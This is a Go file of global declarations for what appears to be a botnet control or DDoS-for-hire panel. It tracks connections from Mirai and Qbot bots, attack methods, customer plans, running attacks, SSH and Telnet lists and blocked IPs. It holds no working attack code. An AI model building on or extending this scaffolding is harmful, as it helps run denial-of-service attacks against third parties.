package database

import (
	"Manager/assets"
	"io"
	"net"
	"os/exec"
)

var Servers struct {
	Servers []map[string]assets.Server `json:"Servers"`
}

var Nets struct {
	SSHs    []map[string]assets.SSH    `json:"SSH"`
	Telnets []map[string]assets.Telnet `json:"Telnet"`
}

var Methods struct {
	Methods []assets.Method `json:"Methods"`
}
var Concurrents struct {
	Running []assets.Concurrent `json:"Running"`
}
var Plans struct {
	Plans []assets.Plan `json:"Plans"`
}
var Ongoing struct {
	Attacks []assets.Attack `json:"Attacks"`
}
var Tokens []assets.Token
var Config assets.Config
var Users []assets.User
var Version = "Cherry"
var Qbots []net.Conn
var Mirai []net.Conn
var BlockedIPs = make(map[string]bool)
var Attacks []assets.Attack
var ServerIP string
var HostCooldown = []string{}

type Cm struct {
	Cmd    *exec.Cmd
	Stdin  *io.WriteCloser
	Stdout *io.ReadCloser
}

var Connected = make([]Cm, 0)
